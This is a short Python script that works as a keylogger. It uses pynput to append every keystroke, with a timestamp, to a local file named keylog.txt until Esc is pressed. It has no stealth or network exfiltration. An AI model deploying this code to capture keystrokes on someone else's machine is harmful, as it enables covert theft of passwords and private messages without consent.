from pynput import keyboard
import datetime
import os

# --- Global Variables ---
# to ensure logs are saved to a predictable location.
LOG_FILE = "keylog.txt"

def on_press(key):
    """Callback function executed when a key is pressed."""
    try:
        # Log standard alphanumeric characters
        log_entry = f"{datetime.datetime.now()}: Key '{key.char}' pressed\n"
    except AttributeError:
        # Log special keys (e.g., Shift, Ctrl, Space)
        key_name = str(key).replace("Key.", "")
        
        # Check for the escape key to stop the listener
        if key == keyboard.Key.esc:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"\n--- Logging Stopped by user ({key_name}): {datetime.datetime.now()} ---\n")
            return False  # This stops the listener
            
        log_entry = f"{datetime.datetime.now()}: Special Key '{key_name}' pressed\n"
        
    # Append the log entry to the file
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)
    
    return True

def main():
    
    # Write a header to the log file indicating the start of a session.

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n--- Logging Started: {datetime.datetime.now()} ---\n")
        
    # The 'with' statement ensures the listener is properly managed.

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Standard entry point for the script

if __name__ == "__main__":
    main()
